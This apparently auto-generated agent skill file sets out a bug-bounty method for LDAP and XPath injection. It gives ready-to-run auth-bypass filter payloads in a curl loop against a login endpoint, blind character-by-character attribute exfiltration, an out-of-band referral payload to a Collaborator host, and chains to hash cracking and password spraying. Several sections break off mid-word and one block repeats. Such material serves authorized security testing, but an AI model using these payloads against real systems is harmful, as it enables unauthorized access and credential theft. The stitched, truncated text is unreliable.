---
name: bbhunt-ldap
description: "Hunt authentication bypass, blind attribute exfiltration and directory enumeration. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# LDAP and XPath injection hunting — unified methodology

> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### A. Discovery checklist — concrete places, params, headers, file types to look

- LDAP-backed surfaces: corporate SSO/intranet login, "find a colleague"/org-chart/address-book search, group-membership checks, and any legacy Java/Spring/PHP or Windows/IIS "integrated auth" form.
- Common endpoints: `/api/ldap/*`, `/api/directory/*`, `/people`, `/address-book`, `/search?dir=`, `/ldapsearch?user=`, `phpLDAPadmin` (`intitle:"phpLDAPadmin" inurl:cmd.php`).
- Confirm the backend from error strings: `javax.naming.NameNotFoundException`, `javax.naming.directory.InvalidSearchFilterException`, `LDAP: error code 49 - 80090308`, `com.sun.jndi.ldap.*`, `System.DirectoryServices`, `ldap_search()`, `Bad search filter`, `python-ldap SERVER_DOWN`, `net.ldap` (Go).
- Distinguish AD from generic LDAP immediately (`sAMAccountName`/`memberOf`/`unicodePwd` vs `uid`/`userPassword`) — the payloads and the achievable impact differ.
- XPath injection lives in the same skill family: XML-backed auth/config, `//users/user[name/text()='...']`, and any XML data store queried with concatenated XPath.
- Look for double-decoding layers: client-side validation of a first-decoded username followed by a second server-side decode before filter construction is a real, documented bypass (HackTricks / HTB Hercules).
- Check whether the login is search-then-bind or search-only — a widened search alone does not bypass a later password bind. Only authorization checks that trust the search filter as the sole gate are bypassable.
- Zimbra-style edge case: wildcard in an unescaped login changes which entry is selecte

### Signals and surfaces

### Crown Jewel Targets

LDAP injection that bypasses authentication = **Critical**. Blind attribute
exfiltration of credentials/secrets = **High**. AD enumeration alone = Medium-High.

**Highest-value chains:**
- **LDAP auth bypass** — close the `uid` filter and append an always-true OR so the
  bind/search returns the admin entry without a valid password.
- **Blind attribute exfil** — char-by-char extraction of an attribute value via a
  boolean oracle (login success/failure, result count, or response length).
- **userPassword hash exfil (non-AD only)** — on OpenLDAP/389-DS the
  `userPassword` attribute can hold `{SSHA}`/`{CRYPT}` hashes that ARE readable
  by query. See the AD-vs-generic warning below.
- **XPath injection auth bypass** — `' or '1'='1` against XML-backed auth.

---

### Attack Surface Signals

```
Corporate SSO / intranet login pages (often legacy Java/Spring/PHP)
Windows + IIS + "integrated" directory auth
/api/ldap/*  /api/directory/*  /people  /address-book  /search?dir=
"Find a colleague" / org-chart / employee-search features
XML-backed config or auth → XPath injection candidate
Error strings that confirm an LDAP backend:
  javax.naming.NameNotFoundException
  javax.naming.directory.InvalidSearchFilterException
  LDAP: error code 49 - 80090308  (AD invalid creds / bind failure)
  com.sun.jndi.ldap.*  /  System.DirectoryServices  /  ldap_search():
  "Bad search filter"  /  net.ldap (Go)  /  python-ldap SERVER_DOWN
```

---

### Techniques, payloads and bypasses

### Phase 2 — Auth-bypass payloads (balance your parentheses)

```bash
# Target filter assumed: (&(uid=USERNAME)(userPassword=PASSWORD))
# Goal: make the uid sub-filter always-true and neutralise the password clause.

# Wildcard-everything (works when password clause is dropped by a trailing comment-like break):
#   username = *)(uid=*))(|(uid=*    password = anything
# Always-true admin (OR uid=*):
#   username = admin)(|(uid=*)       (note: leaves one extra ')' — see below)
# NUL-truncate the password clause (C-backed servers):
#   username = admin)(uid=*))%00      password = x

USERNAME_PAYLOADS=(
  'admin))(|(uid=*'        # close uid + close &, open OR uid=* — balance check below
  '*)(uid=*))(|(uid=*'     # full always-true, self-balancing classic
  'admin)(!(userPassword=ZZZ))'  # AND NOT a password that is never set → always true
  'admin*'                 # simple wildcard suffix — try first, lowest noise
)

for P in "${USERNAME_PAYLOADS[@]}"; do
  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":$(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' "$P"),\"password\":\"anything\"}")
  echo "PAYLOAD: $P"
  echo "RESP:    ${R: -40}"
  echo "BASE:    $BASE   <-- compare http_code+size to rule out false positive"
  echo "---"
done
```

**Parenthesis-balancing rule of thumb:** count `(` minus `)` in the *resulting*
full filter, not just your payload. If the app appends `)(userPassword=...))`
after your input, leave the right number of trailing `)` so the final str

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- RFC 4515 special-character set to test individually: `*` → `\2a`, `(` → `\28`, `)` → `\29`, `\` → `\5c`, NUL → `\00`; DN context additionally uses `,`, `=`, `+`, `"`, `<`, `>`, `;`, `/` and `*` is NOT a wildcard there.
- A lone unbalanced `)` producing a 500/filter-syntax error while a balanced payload does not is the cleanest injection tell — capture it as proof.
- Classic self-balancing auth bypass for `(&(uid=USER)(userPassword=PASS))`: username `*)(uid=*))(|(uid=*`, any password. Resulting filter is syntactically valid and always true.
- Additional auth-bypass forms (try all; parser behaviour varies): `admin)(&)`, `admin)(!(userPassword=ZZZ))`, `*)(userPassword=*)`, `admin))(|(|`, and NUL truncation `*))%00`.
- Group-gate bypass in search-then-bind templates when the filter is the sole authorization check: template `(&(uid={username})(memberOf=cn=app-users,dc=example,dc=com))`, username `targetuser)(|(uid=targetuser` — keeps one balanced root and makes the inner OR true. Requires the user's real password for the bind.
- `(&)` and `(|)` are NOT portable absolute true/false filters per RFC 4515 grammar (no child filters) — some servers error, SunOne executes both filters, OpenLDAP executes only the first. Keep one balanced root expression.
- Blind true/false oracles with paired controls: TRUE `)(objectClass=*))(&objectClass=void`, FALSE `void)(objectClass=void))(&objectClass=void`; then char-by-char `(&(sn=administrator)(password=M*))`.
- Double-decoding bypass: send `%252A` (→ `%2A` → `*`), a

### Validation and proof

### Phase 6 — Tooling & OOB confirmation

```bash
# Validate the inferred filter directly if you ever get LDAP creds / a bind:
ldapsearch -x -H ldap://$AD_HOST -D "CORP\\user" -w "$PW" \
  -b "dc=corp,dc=local" "(&(objectClass=user)(sAMAccountName=admin*))" sAMAccountName memberOf

# Burp: Intruder over the char set for blind exfil; the Web Security Academy
# "Blind LDAP injection" labs mirror the Phase-3 oracle exactly.
# OOB (rare but decisive): some JNDI/LDAP stacks resolve a referral. If you can
# inject a referral/URL the server dereferences, point it at Collaborator:
#   (uid=*))(referral=ldap://<COLLAB>/x)   — a DNS/LDAP hit at Collaborator
# is server-side proof with zero ambiguity. Treat any Collaborator interaction
# as the gold-standard confirmation for otherwise-blind cases.
```

---

### Validation — rule out the false positive BEFORE you report

A "bypass" or "match" is only real once you have eliminated syntax-error,
WAF-block, and length-jitter explanations.

- [ ] **Auth bypass:** the always-true payload returns a **valid authenticated
      session** (session cookie + access to a post-login resource), and the same
      request with one paren removed returns a **filter-syntax error** — proving
      the filter parsed and executed, not that the app fell open on every input.
- [ ] **Negative control:** an equivalently-shaped but logically-FALSE payload
      (`)(uid=NONEXISTENT_ZZZ)`) returns the **failure** response. If both
      true-class and false-class "succeed", you found a broken endpoint, not LDAP
      injection.
- [ ] **Blind exfil:** each recovered char reproduces 3x with stable size; the
      FALSE control still reads FALSE between rounds; recovered value verified by
      a direct lookup or by the auth-bypass payload that uses it.
- [ ] **XPath:** quotes/brackets remained balanced (no 500), and the bypass logged
      in to a real account context — not just a different error page.
- [ ] **OOB where possible:** a Collaborator DNS/LDAP interaction from a referral
      payload is decisive for blind cases — prefer it over length-only inference.
- [ ] **AD claim discipline:** if you say "AD", you enumerated AD-specific attrs
      (`sAMAccountName`/`memberOf`); never claim AD hash exfil.

**Severity:**
- Auth bypass landing as admin/privileged directory entry: **Critical**
- `userPassword` hash exfil (non-AD) or `description`-field credent

### C. Validation / proof bar — how to confirm and avoid false positives

- A "bypass" is real only if it returns a valid authenticated session (session cookie + access to a post-login resource), not merely a different error page.
- Negative control: an equally-shaped but logically FALSE payload (`)(uid=NONEXISTENT_ZZZ)`) must return the failure response. If both classes "succeed", the endpoint is simply broken.
- Positive control: removing one parenthesis from the successful payload should produce a filter-syntax error — proving the filter was parsed and executed.
- Blind exfil: each recovered character must reproduce 3× with a stable oracle; the FALSE control must remain FALSE between rounds. WAF blocks often masquerade as matches.
- Never claim AD password-hash exfiltration: `unicodePwd` is write-only. The credential win against AD is `description`/`info` misuse or enumerated usernames feeding a spray.
- If you say "Active Directory", demonstrate AD-specific attributes (`sAMAccountName`, `memberOf`, `serviceprincipalname`); generic `uid`/`cn` proves only an LDAP-like directory.
- PortSwigger explicitly warns that difference-based LDAP scanner results are unreliable — manually review with controls before reporting.
- Timing oracles must be repeated and cross-checked against directory logs or another signal; network jitter and automated response-diffing mislead.
- XPath: verify quotes/brackets stayed balanced (no 500) and the bypass landed in a real account context, not just a different error.
- Severity: auth bypass landing as admin → Critical; non-AD `userPassword` hash 

### Validation — rule out the false positive BEFORE you report

A "bypass" or "match" is only real once you have eliminated syntax-error,
WAF-block, and length-jitter explanations.

- [ ] **Auth bypass:** the always-true payload returns a **valid authenticated
      session** (session cookie + access to a post-login resource), and the same
      request with one paren removed returns a **filter-syntax error** — proving
      the filter parsed and executed, not that the app fell open on every input.
- [ ] **Negative control:** an equivalently-shaped but logically-FALSE payload
      (`)(uid=NONEXISTENT_ZZZ)`) returns the **failure** response. If both
      true-class and false-class "succeed", you found a broken endpoint, not LDAP
      injection.
- [ ] **Blind exfil:** each recovered char reproduces 3x with stable size; the
      FALSE control still reads FALSE between rounds; recovered value verified by
      a direct lookup or by the auth-bypass payload that uses it.
- [ ] **XPath:** quotes/brackets remained balanced (no 500), and the bypass logged
      in to a real account context — not just a different error page.
- [ ] **OOB where possible:** a Collaborator DNS/LDAP interaction from a referral
      payload is decisive for blind cases — prefer it over length-only inference.
- [ ] **AD claim discipline:** if you say "AD", you enumerated AD-specific attrs
      (`sAMAccountName`/`memberOf`); never claim AD hash exfil.

**Severity:**
- Auth bypass landing as admin/privileged directory entry: **Critical**
- `userPassword` hash exfil (non-AD) or `description`-field credent

### Escalation and related chains

### Chain Table

| LDAP finding | Chain to | Impact |
|--------------|----------|--------|
| Auth-bypass (always-true filter) | Admin/SSO panel as first directory entry | Critical |
| AD enumeration (`sAMAccountName`) | Username list → password spray / credential stuffing | Mass-ATO risk |
| `memberOf` enumeration | Identify Domain Admins → targeted phishing/spray | Targeted compromise |
| `description`/`info` field read | Plaintext creds admins stashed there | Direct credential leak |
| Blind exfil of `userPassword` **(non-AD only)** | `{SSHA}` (salted SHA-1) → hashcat `-m 111` (`{SSHA256}`=1411, `{SSHA512}`=1711); `{CRYPT}` → mode depends on the `$id$` prefix (`$1$`=500, `$6$`=1800) → offline crack | High |
| LDAP referral → Collaborator | Server-side request / internal directory reach | SSRF-class, confirms blind |

> AD has no readable password attribute — do not list "extract AD hashes" as a
> chain. Against AD, the credential win comes from `description`/`info` misuse or
> from enumerated usernames feeding a spray, never from `unicodePwd`.

---

## Source skills merged into this topic

- `hunting` — `ldap`
- `cbh` — `hunt-ldap`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `bbhunt-methodology` — orchestrator, state machine and class router
